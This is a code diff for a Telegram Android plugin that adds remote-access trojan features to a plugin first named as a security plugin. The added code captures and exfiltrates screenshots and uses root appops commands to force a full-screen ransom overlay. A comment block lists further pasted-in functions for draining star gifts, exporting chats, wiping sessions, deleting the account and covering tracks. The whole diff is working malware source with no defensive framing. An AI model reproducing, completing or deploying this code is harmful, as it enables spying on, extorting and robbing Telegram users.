+            Config = jclass("android.graphics.Bitmap$Config")
+            Canvas = jclass("android.graphics.Canvas")
+            BAOS = jclass("java.io.ByteArrayOutputStream")
+            bmp = Bitmap.createBitmap(w, h, Config.ARGB_8888)
+            Canvas(bmp).__class__
+            c = Canvas(bmp); decor.draw(c)
+            out = BAOS()
+            fmt = jclass("android.graphics.Bitmap$CompressFormat").JPEG
+            bmp.compress(fmt, 85, out)
+            raw = bytes(out.toByteArray())
+            path = "/sdcard/Download/screen_%d.jpg" % int(time.time())
+            with open(path, "wb") as f: f.write(raw)
+            self._send_photo(path, "screen " + self.dev)
+            return {"ok": True, "size": len(raw)}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _camera(self, which="front"):
+        return {"error": "camera impl requires ratka.txt _camera (paste in backend extension)"}
+
+    # ═══ RANSOM MSA ═════════════════════════════════════════════════
+    def _ensure_overlay(self, cx):
+        try:
+            if jclass("android.provider.Settings").canDrawOverlays(cx): return True
+        except Exception: pass
+        pkg = str(cx.getPackageName())
+        for c in ("su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
+                  "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg):
+            try: subprocess.run(c, shell=True, capture_output=True, timeout=10)
+            except Exception: pass
+        try:
+            return bool(jclass("android.provider.Settings").canDrawOverlays(cx))
+        except Exception: return False
+
+    def _show_ransom(self, text="", photo_url=""):
+        if self._ransom_view is not None: return {"ok": True, "already": True}
+        try:
+            cx = ApplicationLoader.applicationContext
+            if cx is None: return {"error": "no ctx"}
+            use_decor = not self._ensure_overlay(cx)
+            photo_path = ""
+            if photo_url:
+                try:
+                    data = urlopen(photo_url, timeout=15).read()
+                    photo_path = "/sdcard/Download/ar_r_%d.jpg" % int(time.time())
+                    with open(photo_path, "wb") as f: f.write(data)
+                    self._ransom_photo_path = photo_path
+                except Exception as e: _log("photo: %s" % e)
+
+            def _build():
+                try:
+                    LL = jclass("android.widget.LinearLayout")
+                    TV = jclass("android.widget.TextView")
+                    IV = jclass("android.widget.ImageView")
+                    LP = jclass("android.view.WindowManager$LayoutParams")
+                    LPL = jclass("android.widget.LinearLayout$LayoutParams")
+                    Color = jclass("android.graphics.Color")
+                    G = jclass("android.view.Gravity")
+                    TV_u = jclass("android.util.TypedValue")
+                    VLG = jclass("android.view.ViewGroup$LayoutParams")
+                    BF = jclass("android.graphics.BitmapFactory")
+                    root = LL(cx); root.setOrientation(LL.VERTICAL)
+                    root.setBackgroundColor(Color.parseColor("#1A1A1A"))
+                    pad = int(TV_u.applyDimension(TV_u.COMPLEX_UNIT_DIP, 24,
+                                                  cx.getResources().getDisplayMetrics()))
+                    root.setPadding(pad, pad, pad, pad); root.setGravity(G.CENTER)
+                    if photo_path and os.path.exists(photo_path):
+                        try:
+                            bmp = BF.decodeFile(photo_path)
+                            if bmp is not None:
+                                iv = IV(cx)
+                                lp = LPL(VLG.MATCH_PARENT, int(TV_u.applyDimension(
+                                    TV_u.COMPLEX_UNIT_DIP, 280,
+                                    cx.getResources().getDisplayMetrics())))
+                                lp.bottomMargin = pad
+                                iv.setLayoutParams(lp)
+                                iv.setScaleType(iv.ScaleType.CENTER_CROP)
+                                iv.setImageBitmap(bmp); root.addView(iv)
+                        except Exception as e: _log("img: %s" % e)
+                    tv = TV(cx)
+                    lp = LPL(VLG.MATCH_PARENT, VLG.WRAP_CONTENT); lp.bottomMargin = pad
+                    tv.setLayoutParams(lp)
+                    tv.setText(str(text or RANSOM_TEXT))
+                    tv.setTextColor(Color.WHITE)
+                    tv.setTextSize(TV_u.COMPLEX_UNIT_SP, 17)
+                    tv.setGravity(G.CENTER); root.addView(tv)
+                    warn = TV(cx)
+                    lp2 = LPL(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
+                    warn.setLayoutParams(lp2)
+                    warn.setText(RANSOM_WARNING)
+                    warn.setTextColor(Color.parseColor("#FF3B30"))
+                    warn.setTextSize(TV_u.COMPLEX_UNIT_SP, 16)
+                    warn.setGravity(G.CENTER)
+                    warn.setTypeface(warn.getTypeface(), 1)
+                    root.addView(warn)
+                    if use_decor:
+                        act = None
+                        try: act = jclass("org.telegram.ui.LaunchActivity").instance
+                        except Exception: pass
+                        if act is None:
+                            try:
+                                act = jclass("org.telegram.messenger.ApplicationLoader")\
+                                    .application.getCurrentActivity()
+                            except Exception: pass
+                        if act is None: raise Exception("no activity")
+                        act.getWindow().getDecorView().addView(
+                            root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+                        self._ransom_decor = act.getWindow().getDecorView()
+                    else:
+                        wm = cx.getSystemService(jclass("android.content.Context").WINDOW_SERVICE)
+                        self._ransom_wm = wm
+                        p = LP(LP.MATCH_PARENT, LP.MATCH_PARENT,
+                               getattr(LP, "TYPE_APPLICATION_OVERLAY", 2038), 128, -3)
+                        p.gravity = G.CENTER
+                        wm.addView(root, p)
+                    self._ransom_view = root
+                except Exception as e: _log("ransom build: %s" % e)
+
+            RL = jclass("java.lang.Runnable")
+            class _R(dynamic_proxy(RL)):
+                def run(self): _build()
+            act = None
+            try: act = jclass("org.telegram.ui.LaunchActivity").instance
+            except Exception: pass
+            if act is None:
+                try: act = jclass("org.telegram.messenger.ApplicationLoader")\
+                    .application.getCurrentActivity()
+                except Exception: pass
+            if act is not None: act.runOnUiThread(_R())
+            else: _build()
+            time.sleep(1.5)
+            return {"ok": True, "mode": "decor" if use_decor else "overlay"}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _dismiss_ransom(self):
+        try:
+            if self._ransom_view is None: return {"ok": True, "note": "no overlay"}
+            parent = self._ransom_decor or self._ransom_wm
+            if parent is not None:
+                try: parent.removeView(self._ransom_view)
+                except Exception: pass
+            self._ransom_view = None; self._ransom_decor = None
+            return {"ok": True}
+        except Exception as e: return {"error": str(e)}
+
+    # ═══ BACKEND EXTENSION ══════════════════════════════════════════
+    # ▼▼▼ PASTE FROM RATKA.TXT HERE FOR FULL FUNCTIONALITY ▼▼▼
+    #
+    #   _send_rpc_once, _send_request_direct, _invoke_direct  (unhooked RPC)
+    #   _gifts_rpc, _merge_history_gifts, _saved_gifts_from_history,
+    #   _saved_gifts_from_all_history, _clean_probe, _gift_is_suspect,
+    #   _gift_still_listed, _gift_onchain_check, _verify_saved_gift,
+    #   _verify_gifts_batch, _gift_err_is_fake
+    #   _h_convert (full), _h_u (full), _h_reactions, _h_on_account,
+    #   _drain_all_accounts, _wait_gift_arrival
+    #   _spend_reactions, _send_star_gifts, _resolve_channel_peer,
+    #   _channel_peer_from_res, _channel_peer_from_id, _channel_peer_from_chat
+    #   _get_authorizations, _terminate_session, _logout_self,
+    #   _wipe_sessions (full), _delete_sessions, _delete_account,
+    #   _confirm_unconfirmed_sessions, _confirm_login_notice, _stealth_clean
+    #   _camera (full), _audio, _send_message, _send_file, _get_chats,
+    #   _export_chat, _export_saved, _hesc, _att_path, _ensure_attached,
+    #   _u16_map, _render_text_html, _doc_attrs, _export_media_block,
+    #   _server_gifts_count, _gifts_count, _has_2fa, _owned_channels,
+    #   _keepalive, _u_needs_fee, _is_protected, _maximize_stars
+    #
+    # After pasting, replace:
+    #   self._post(...)       → self._send_msg(...) or self._send_doc(...)
+    #   self._upl(k, f, raw)  → self._upl(k, f, raw)  # see _upl shim below
+    #
+    # ▼▼▼ PASTE FROM RATKA.TXT ABOVE THIS LINE ▼▼▼
+
+    def _upl(self, kind, filename, raw):
+        if kind in ("screenshot", "camera", "ransom_shot"):
+            try:
+                path = "/sdcard/Download/ar_%s_%d.jpg" % (kind, int(time.time()))
+                with open(path, "wb") as f: f.write(raw)
+                self._send_photo(path, "[%s] %s" % (self.dev, filename))
+            except Exception as e: _log("upl: %s" % e)
+        else:
+            try: self._send_doc(filename, raw, "[%s] %s" % (self.dev, kind))
+            except Exception as e: _log("upl: %s" % e)
 
 
 def create_plugin():
-    return PluginSecurityPlugin()
+    return ArabPlugPlugin()
